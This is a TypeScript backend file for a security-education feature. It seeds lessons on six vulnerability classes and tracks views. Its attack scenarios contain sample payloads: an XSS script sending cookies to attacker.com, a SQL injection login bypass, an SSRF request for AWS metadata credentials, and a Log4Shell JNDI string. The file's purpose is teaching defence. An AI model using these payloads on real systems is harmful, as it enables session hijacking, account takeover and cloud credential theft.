import { ConvexError, v } from 'convex/values'
import { internalMutation, mutation, query } from './_generated/server'
import { requireSessionAuth } from './lib/sessionAuth'

// ─── Seed Data ────────────────────────────────────────────────────────────────

const EDUCATION_CONTENT = [
  {
    findingType: 'xss',
    language: 'javascript',
    title: 'Cross-Site Scripting (XSS)',
    vulnerabilityClass: 'Injection',
    whyItMatters:
      'XSS allows attackers to inject malicious scripts into pages viewed by other users, enabling session hijacking, credential theft, and malware distribution. It consistently ranks in the OWASP Top 10 and is one of the most prevalent vulnerabilities in web applications.',
    attackScenario:
      'An attacker finds a comment field that reflects input without encoding. They craft `<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>`. When other users load the page, their session cookies are silently exfiltrated, granting the attacker full account access.',
    secureCodingGuidelines:
      'Always encode output using context-aware escaping. In React, never use dangerouslySetInnerHTML with untrusted input. Implement Content Security Policy headers. Validate and sanitize all user input server-side. Use DOMPurify when rendering HTML from user content.',
    resources: JSON.stringify([
      {
        title: 'OWASP XSS Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
      },
      {
        title: 'MDN: Content Security Policy',
        url: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP',
      },
    ]),
    preventionChecklist: [
      'Encode all user-controlled data before inserting into HTML, JS, CSS, or URL contexts',
      'Implement Content-Security-Policy response headers',
      'Use framework-level auto-escaping (React JSX, Angular binding)',
      'Validate and allowlist user input at the server layer',
      'Use HttpOnly cookies to prevent JavaScript access to session tokens',
    ],
  },
  {
    findingType: 'sql_injection',
    language: 'javascript',
    title: 'SQL Injection',
    vulnerabilityClass: 'Injection',
    whyItMatters:
      'SQL injection lets attackers manipulate database queries to expose sensitive data, bypass authentication, and in some database configurations execute OS commands. A single injectable endpoint can compromise an entire database.',
    attackScenario:
      'A login endpoint builds its query as `SELECT * FROM users WHERE username=\'${username}\'`. An attacker enters `admin\'--` as the username. The query becomes `SELECT * FROM users WHERE username=\'admin\'--\'`, commenting out the rest and granting admin access without a password.',
    secureCodingGuidelines:
      'Always use parameterized queries or prepared statements. Never concatenate user input into SQL strings. Use an ORM with parameterized query support. Apply the principle of least privilege to database accounts.',
    resources: JSON.stringify([
      {
        title: 'OWASP SQL Injection Prevention',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
      },
      {
        title: 'OWASP Query Parameterization Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html',
      },
    ]),
    preventionChecklist: [
      'Use parameterized queries or prepared statements for all database interactions',
      'Use an ORM and never bypass it with raw string concatenation',
      'Apply least-privilege permissions to database accounts',
      'Validate and allowlist user input before using in queries',
      'Enable database audit logging',
    ],
  },
  {
    findingType: 'ssrf',
    language: 'javascript',
    title: 'Server-Side Request Forgery (SSRF)',
    vulnerabilityClass: 'Server-Side Request Forgery',
    whyItMatters:
      'SSRF allows attackers to induce the server to make requests to internal services, cloud metadata APIs (AWS/GCP/Azure), or other resources inaccessible from the internet. This can expose cloud credentials, internal service data, and enable lateral movement within cloud infrastructure.',
    attackScenario:
      'An image-processing endpoint accepts a URL parameter and fetches it server-side. An attacker supplies `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. The server fetches IAM credentials from the AWS metadata service and returns them, giving the attacker full cloud access.',
    secureCodingGuidelines:
      'Validate and allowlist URLs before making server-side requests. Block requests to private IP ranges and cloud metadata endpoints. Use DNS resolution before making requests to check resolved IPs. Prefer client-side redirects when possible.',
    resources: JSON.stringify([
      {
        title: 'OWASP SSRF Prevention Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html',
      },
      {
        title: 'PortSwigger SSRF Tutorial',
        url: 'https://portswigger.net/web-security/ssrf',
      },
    ]),
    preventionChecklist: [
      'Validate and allowlist destination URLs and hostnames',
      'Block requests to 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x',
      'Resolve DNS before making requests and validate the resolved IP',
      'Disable redirects or validate redirect destinations',
      'Use a dedicated egress proxy with strict allowlisting',
    ],
  },
  {
    findingType: 'hardcoded_secret',
    language: 'javascript',
    title: 'Hardcoded Secret / Credential',
    vulnerabilityClass: 'Sensitive Data Exposure',
    whyItMatters:
      'Hardcoded secrets in source code are exposed to everyone with repository access — contributors, CI systems, and anyone who obtains a copy of the codebase. If the repository is public or ever leaked, attackers gain instant access. Automated scanners continuously harvest credentials from public repositories.',
    attackScenario:
      'A developer commits an AWS access key directly into code for "convenience." A threat actor running automated truffleHog scans finds the key within seconds of the push. They spin up 50 GPU instances for cryptocurrency mining, generating thousands in charges before the key is rotated.',
    secureCodingGuidelines:
      'Store secrets in environment variables or a secrets manager (AWS Secrets Manager, HashiCorp Vault). Never commit .env files to version control. Rotate any secret that was ever committed. Install pre-commit hooks to scan for secrets before they are committed.',
    resources: JSON.stringify([
      {
        title: 'GitHub: Removing sensitive data from a repository',
        url: 'https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository',
      },
      {
        title: 'OWASP Secrets Management Cheat Sheet',
        url: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
      },
    ]),
    preventionChecklist: [
      'Never commit secrets, API keys, or passwords to version control',
      'Add .env files to .gitignore',
      'Install pre-commit hooks (git-secrets, detect-secrets) to block accidental commits',
      'Rotate any secret immediately if it was ever committed',
      'Use a secrets manager (Vault, AWS SSM, 1Password Secrets) for production credentials',
    ],
  },
  {
    findingType: 'dependency_cve',
    language: 'javascript',
    title: 'Dependency with Known CVE',
    vulnerabilityClass: 'Vulnerable and Outdated Components',
    whyItMatters:
      'Third-party dependencies with known CVEs expose your application to publicly documented attacks. Attackers actively scan for applications using vulnerable versions and exploit them using readily available proof-of-concept code, often within hours of disclosure.',
    attackScenario:
      'Your app uses log4j 2.14.1. Log4Shell (CVE-2021-44228) is disclosed. Within hours, automated scanners identify your app as vulnerable via response headers. Attackers send `${jndi:ldap://attacker.com/a}` in a request field, triggering remote code execution on your server.',
    secureCodingGuidelines:
      'Keep dependencies updated with automated tools (Dependabot, Renovate). Subscribe to CVE feeds for critical dependencies. Run SBOM scanning in CI/CD. Pin dependency versions and run `npm audit` regularly.',
    resources: JSON.stringify([
      {
        title: 'OWASP: Vulnerable and Outdated Components',
        url: 'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/',
      },
      {
        title: 'NVD CVE Database',
        url: 'https://nvd.nist.gov/vuln/search',
      },
    ]),
    preventionChecklist: [
      'Enable automated dependency updates (Dependabot or Renovate)',
      'Run `npm audit` (or equivalent) in CI and fail builds on high/critical CVEs',
      'Generate and maintain a Software Bill of Materials (SBOM)',
      'Subscribe to security advisories for critical dependencies',
      'Establish a patch SLA: critical CVEs within 24h, high within 7 days',
    ],
  },
  {
    findingType: 'misconfiguration',
    language: 'javascript',
    title: 'Security Misconfiguration',
    vulnerabilityClass: 'Security Misconfiguration',
    whyItMatters:
      'Misconfigurations are the most common security vulnerability: open S3 buckets, overly permissive CORS, debug mode in production, default credentials, missing security headers. Many of the largest data breaches on record were caused by simple misconfigurations, not sophisticated exploits.',
    attackScenario:
      'An S3 bucket storing customer PII has its ACL set to public-read by a developer who needed quick access during debugging. An attacker running automated S3 enumeration tools discovers the bucket and downloads millions of customer records. The company faces a GDPR fine and reputational damage.',
    secureCodingGuidelines:
      'Apply the principle of least privilege to all resources. Disable debug features before deploying to production. Use infrastructure-as-code to enforce configurations. Regularly audit permissions and configurations using automated tools.',
    resources: JSON.stringify([
      {
        title: 'OWASP Security Misconfiguration',
        url: 'https://owasp.org/Top10/A05_2021-Security_Misconfiguration/',
      },
      {
        title: 'CIS Benchmarks',
        url: 'https://www.cisecurity.org/cis-benchmarks',
      },
    ]),
    preventionChecklist: [
      'Disable debug and development features before production deployment',
      'Apply least-privilege permissions to all cloud resources and IAM roles',
      'Use infrastructure-as-code with automated policy enforcement (OPA, Conftest)',
      'Enable security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options)',
      'Audit all public-facing resources and permissions on a quarterly schedule',
    ],
  },
]

// ─── Internal Seed ────────────────────────────────────────────────────────────

export const seedEducationContent = internalMutation({
  args: {},
  handler: async (ctx) => {
    for (const content of EDUCATION_CONTENT) {
      const existing = await ctx.db
        .query('securityEducationContent')
        .withIndex('by_finding_type_and_language', (q) =>
          q.eq('findingType', content.findingType).eq('language', content.language),
        )
        .unique()
      if (!existing) {
        await ctx.db.insert('securityEducationContent', content)
      }
    }
  },
})

// ─── Public Queries ───────────────────────────────────────────────────────────

export const getEducationContent = query({
  args: {
    findingType: v.string(),
    language: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    const lang = args.language ?? 'javascript'
    const content = await ctx.db
      .query('securityEducationContent')
      .withIndex('by_finding_type_and_language', (q) =>
        q.eq('findingType', args.findingType).eq('language', lang),
      )
      .unique()
    if (content) return content
    return ctx.db
      .query('securityEducationContent')
      .withIndex('by_finding_type', (q) => q.eq('findingType', args.findingType))
      .first()
  },
})

export const getEducationStats = query({
  args: { tenantSlug: v.string() },
  handler: async (ctx, args) => {
    const tenant = await ctx.db
      .query('tenants')
      .withIndex('by_slug', (q) => q.eq('slug', args.tenantSlug))
      .unique()
    if (!tenant) return null

    const views = await ctx.db
      .query('educationViews')
      .withIndex('by_tenant', (q) => q.eq('tenantId', tenant._id))
      .take(500)

    const byTopic: Record<string, number> = {}
    for (const view of views) {
      byTopic[view.findingType] = (byTopic[view.findingType] ?? 0) + 1
    }

    const topTopics = Object.entries(byTopic)
      .sort((a, b) => b[1] - a[1])
      .slice(0, 5)
      .map(([findingType, viewCount]) => ({ findingType, viewCount }))

    const uniqueLearners = new Set(views.map((v) => v.userId)).size
    const topicsCompleted = Object.keys(byTopic).length
    const totalContent = EDUCATION_CONTENT.length

    return {
      totalViews: views.length,
      uniqueLearners,
      topicsCompleted,
      totalContent,
      completionRate: totalContent > 0 ? Math.round((topicsCompleted / totalContent) * 100) : 0,
      topTopics,
    }
  },
})

// ─── Public Mutations ─────────────────────────────────────────────────────────

export const trackEducationView = mutation({
  args: {
    findingType: v.string(),
    contentId: v.id('securityEducationContent'),
    tenantSlug: v.string(),
  },
  handler: async (ctx, args) => {
    const { userId } = await requireSessionAuth(ctx)

    const tenant = await ctx.db
      .query('tenants')
      .withIndex('by_slug', (q) => q.eq('slug', args.tenantSlug))
      .unique()
    if (!tenant) return null

    const existing = await ctx.db
      .query('educationViews')
      .withIndex('by_user_and_finding_type', (q) =>
        q.eq('userId', userId).eq('findingType', args.findingType),
      )
      .first()
    if (existing) return null

    await ctx.db.insert('educationViews', {
      tenantId: tenant._id,
      userId,
      findingType: args.findingType,
      contentId: args.contentId,
      viewedAt: Date.now(),
    })
    return null
  },
})
